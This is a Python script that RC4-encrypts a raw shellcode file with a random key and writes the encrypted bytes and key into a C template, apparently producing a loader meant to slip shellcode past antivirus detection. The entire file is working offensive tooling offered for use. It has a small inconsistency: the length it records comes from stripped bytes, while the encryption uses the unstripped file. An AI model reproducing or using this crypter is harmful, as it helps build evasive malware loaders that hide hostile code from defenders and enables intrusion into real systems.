#!/usr/bin/env python3

from typing import Iterator
from base64 import b64encode
from sys import argv,exit,stderr
import argparse
import random
import string


# Based on snovvcrash RC4 encryption script: https://gist.github.com/snovvcrash/3533d950be2d96cf52131e8393794d99
# Stolen from: https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071
def key_scheduling(key):
    key = [ord(char) for char in key]
    sched = [i for i in range(0, 256)]

    i = 0
    for j in range(0, 256):
        i = (i + sched[j] + key[j % len(key)]) % 256
        tmp = sched[j]
        sched[j] = sched[i]
        sched[i] = tmp

    return sched


def stream_generation(sched: list[int]) -> Iterator[bytes]:
    i, j = 0, 0
    while True:
        i = (1 + i) % 256
        j = (sched[i] + j) % 256
        tmp = sched[j]
        sched[j] = sched[i]
        sched[i] = tmp
        yield sched[(sched[i] + sched[j]) % 256]        


def encrypt(plaintext: bytes, key: bytes) -> bytes:
    sched = key_scheduling(key)
    key_stream = stream_generation(sched)
    
    ciphertext = b''
    for char in plaintext:
        enc = char ^ next(key_stream)
        ciphertext += bytes([enc])
        
    return ciphertext

def build_template(shellcode, shellcode_length, key):
    with open("rc4_template.c") as tplate:
        template = tplate.read()
        template = template.replace("###SHELLCODE_LENGTH###", str(shellcode_length))
        template = template.replace("###SHELLCODE###", shellcode)
        template = template.replace("###KEY###", key)

    with open("rc4.c", "w") as outfile:
        outfile.write(template)


def get_raw_sc(input_file):
    input_file = input_file
    file_shellcode = b''
    try:
        with open(input_file, 'rb') as shellcode_file:
            file_shellcode = shellcode_file.read()
            file_shellcode = file_shellcode.strip()
        return(file_shellcode)
    except FileNotFoundError:
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str,
                        help="File containing raw shellcode.")
    
    if len(argv) == 1:
        # No arguments received.  Print help and exit
        parser.print_help(stderr)
        exit(1)

    args = parser.parse_args()
    if args.input:
        input_file = args.input
    else:
        print("You must supply a raw shellcode file using -i/--input!")
        exit(1)

    original_shellcode = ""
    raw_sc = get_raw_sc(input_file)
    for byte in raw_sc:
        original_shellcode = original_shellcode + str(hex(byte).zfill(2)) + ", "
    original_shellcode = original_shellcode.rstrip(', ')

    # https://stackoverflow.com/a/2257449
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

    # read and encrypt shellcode
    with open(args.input, 'rb') as f:
        result = encrypt(plaintext=f.read(), key=key)

    # format the shellcode string
    shellcode = '{}'.format(', '.join(hex(x) for x in result))

    build_template(shellcode, len(raw_sc), key)

    print("Original shellcode:")
    print(original_shellcode)
 

if __name__ == '__main__':
    main()
